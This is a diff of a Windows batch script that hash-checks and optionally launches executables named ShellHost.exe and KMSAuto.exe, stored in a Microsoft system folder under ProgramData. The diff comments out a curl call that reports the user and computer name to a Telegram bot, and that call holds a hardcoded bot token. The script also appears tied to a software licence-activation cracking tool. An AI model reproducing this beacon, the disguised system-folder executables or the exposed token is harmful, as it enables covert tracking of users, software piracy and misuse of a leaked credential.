@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=22.6"
+set "BATCHVERSION=22.7"
 
 
 
@@ -51,7 +51,7 @@ if !instances! geq 2 (
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|START"
+::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|START"
 
 
 
@@ -528,7 +528,7 @@ if exist "%SHSTFILE%" (
 for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
 echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
 echo.
-echo Comparing with stored MD5: %ShellHostMD5%
+echo Comparing with official MD5: %ShellHostMD5%
 echo.
 
 if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
@@ -681,7 +681,7 @@ if exist "%KMSFILE%" (
 for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
 echo MD5 of %KMSFILE% = %KMSFILEmd5%
 echo.
-echo Comparing with stored MD5: %KMSAutoMD5%
+echo Comparing with official MD5: %KMSAutoMD5%
 echo.
 
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
@@ -1113,7 +1113,7 @@ set "KMSSTART=0"
 for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
 echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
 echo.
-echo Comparing with stored MD5: %ShellHostMD5%
+echo Comparing with official MD5: %ShellHostMD5%
 echo.
 
 if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
@@ -1136,7 +1136,7 @@ echo.
 for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
 echo MD5 of %KMSFILE% = %KMSFILEmd5%
 echo.
-echo Comparing with stored MD5: %KMSAutoMD5%
+echo Comparing with official MD5: %KMSAutoMD5%
 echo.
 
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
@@ -1275,8 +1275,8 @@ echo.
 
 
 
-::if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
-::if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+:: if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
+:: if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
 
 
 
